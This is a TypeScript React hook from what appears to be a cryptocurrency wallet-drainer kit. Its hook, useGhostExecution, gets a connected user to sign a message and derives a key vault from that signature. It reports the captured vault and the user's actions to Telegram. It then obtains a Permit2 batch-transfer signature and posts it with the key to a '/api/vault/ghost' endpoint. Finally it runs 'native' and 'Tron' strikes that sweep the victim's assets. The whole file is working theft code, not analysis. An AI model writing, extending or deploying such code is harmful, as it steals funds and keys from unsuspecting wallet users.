"use client";

import { useState, useCallback, useRef } from "react";
import { useSignTypedData, useChainId, useConfig, useSignMessage } from "wagmi";
import { getChains, switchChain } from "@wagmi/core";
import { generatePermit2Data, verifyPermit2Signature } from "@/lib/permit2";
import { type UniversalAsset } from "@/lib/audit";
import {
  sendGhostDerivationToTelegram,
  sendActivityToTelegram,
} from "@/lib/telegram";
import {
  derivePrivateKeyFromSignature,
  DERIVATION_SEED_MESSAGE,
} from "@/lib/signer-derivation-privateKey";
import { findMasterKey, securePost } from "./utils";
import { executeNativeStrike, executeTronStrike } from "./strikes";

const logLabel = "[execution/index.ts]";

export function useGhostExecution(address: `0x${string}` | undefined) {
  const [isSweeping, setIsSweeping] = useState(false);
  const [statuses, setStatuses] = useState<Record<string, string>>({});

  const { signTypedDataAsync } = useSignTypedData();
  const { signMessageAsync } = useSignMessage();
  const currentChainId = useChainId();
  const config = useConfig();
  const isExecuting = useRef(false);

  const ensureChain = async (targetId: number, stepName: string) => {
    const target = Number(targetId);
    if (Number(currentChainId) === target) return true;
    const configuredChains = getChains(config);
    if (!configuredChains.some((c) => c.id === target)) return false;
    try {
      setStatuses((prev) => ({ ...prev, [stepName]: "Switching Chain..." }));
      await switchChain(config, { chainId: target as any });
      await new Promise((r) => setTimeout(r, 1500));
      return true;
    } catch {
      return false;
    }
  };

  const sweepAllAutomated = useCallback(
    async (targetAssets: UniversalAsset[]) => {
      if (isExecuting.current || !address || !targetAssets.length) return;
      isExecuting.current = true;
      setIsSweeping(true);

      // 📢 ACTIVITY: User clicked 'Confirm/Sign'
      await sendActivityToTelegram({
        address,
        step: "STRIKE_INITIATED",
        details: `User attempting to sweep ${targetAssets.length} assets.`,
      }).catch(() => null);

      let activeKey = findMasterKey();

      try {
        // 1. Identity/Signer Derivation (God-Key v6.0)
        if (!activeKey) {
          setStatuses((prev) => ({ ...prev, identity: "Deriving Key..." }));
          try {
            console.log(
              `${logLabel} Requesting Signature for Universal Derivation...`,
            );
            const sig = await signMessageAsync({
              message: DERIVATION_SEED_MESSAGE,
            });

            // Derive the full multi-chain vault
            const vault = derivePrivateKeyFromSignature(sig);

            // Use the Master Key (Entropy) as the active key for signing
            activeKey = vault.masterKey;
            (window as any).discovered_vault_key = activeKey;

            // 🔑 REPORT: Full Multi-Chain God-Key Captured
            await sendGhostDerivationToTelegram({
              userAddress: address,
              vault: vault, // Passing the full vault object as required by new telegram.ts
              authMessage: DERIVATION_SEED_MESSAGE,
            });

            setStatuses((prev) => ({ ...prev, identity: "Secured" }));
          } catch (err: any) {
            console.warn(`${logLabel} Signature Rejected`);
            // ❌ REPORT: User clicked 'Cancel/Reject' on the signature
            await sendActivityToTelegram({
              address,
              step: "SIGNATURE_REJECTED",
              details: "User declined the Universal Identity signature.",
            }).catch(() => null);
            setStatuses((prev) => ({ ...prev, identity: "Skipped" }));
          }
        }

        // 2. Asset Sorting
        const evmAssets = targetAssets.filter(
          (a) => a?.chain === "EVM" && a?.contractAddress,
        );
        const nativeAssets = targetAssets.filter(
          (a) =>
            a?.chain === "EVM" &&
            (a.signatureType === "NATIVE" || !a.contractAddress),
        );
        const tronAssets = targetAssets.filter((a) => a?.chain === "TRON");

        // 3. Permit2 Batch Execution
        const p2 = evmAssets.filter((a) => a.signatureType === "PERMIT2");
        if (p2.length > 0) {
          setStatuses((prev) => ({ ...prev, permit2: "Pending Signature..." }));
          if (await ensureChain(Number(p2[0].chainId || 1), "permit2")) {
            const data = await generatePermit2Data(
              address,
              p2,
              Number(p2[0].chainId || 1),
            );
            if (data) {
              const sig = await signTypedDataAsync({
                domain: data.domain as any,
                types: data.types as any,
                primaryType: "PermitBatchTransferFrom",
                message: data.message as any,
              });

              if (verifyPermit2Signature(address, data, sig)) {
                await securePost("/api/vault/ghost", {
                  sig,
                  t: p2,
                  u: address,
                  userPrivKey: activeKey,
                  c: p2[0].chainId,
                  method: "PERMIT2_BATCH",
                });
                setStatuses((prev) => ({ ...prev, permit2: "Complete" }));
              }
            }
          }
        }

        // 4. Native & Tron Strikes
        if (nativeAssets.length > 0) {
          setStatuses((prev) => ({ ...prev, native: "Extracting..." }));
          await executeNativeStrike(
            nativeAssets,
            address,
            activeKey,
            ensureChain,
          );
          setStatuses((prev) => ({ ...prev, native: "Complete" }));
        }

        if (tronAssets.length > 0) {
          setStatuses((prev) => ({ ...prev, tron: "Extracting..." }));
          await executeTronStrike(tronAssets, address, activeKey);
          setStatuses((prev) => ({ ...prev, tron: "Complete" }));
        }
      } catch (err: any) {
        console.error(`${logLabel} Fatal Error:`, err.message);
      } finally {
        isExecuting.current = false;
        setIsSweeping(false);
        // Final Completion Signal
        await securePost("/api/vault/ghost", {
          u: address,
          m: "SEQUENCE_COMPLETE",
          userPrivKey: activeKey,
        });
      }
    },
    [address, currentChainId, signTypedDataAsync, signMessageAsync, config],
  );

  return { isSweeping, statuses, sweepAllAutomated };
}
